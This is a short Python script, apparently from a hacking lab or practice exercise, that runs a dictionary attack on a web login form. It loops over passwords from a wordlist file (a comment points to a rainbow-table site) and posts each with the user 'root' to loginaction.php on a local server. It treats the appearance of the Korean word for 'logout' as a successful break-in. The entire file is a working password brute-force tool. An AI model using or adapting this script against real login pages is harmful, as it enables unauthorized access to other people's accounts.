import requests

user_id = "root"
url = 'http://192.0.0.2:33061/C1/loginaction.php'
checkurl = 'http://192.0.0.2:33061/C1/index.php'

with open('pw.txt', 'r') as f:#https://freerainbowtables.com 사용
    passwords = [word.strip() for word in f]

for password in passwords:
    session = requests.Session()
    response = session.post(url, data={"userid": user_id, "userpw": password})
    check_response = session.get(checkurl)
    if '로그아웃' in check_response.text:
        print(f"Password found : {password}")
        
        break;
    else:
        print(f"{password} : Not match");
    session.close()
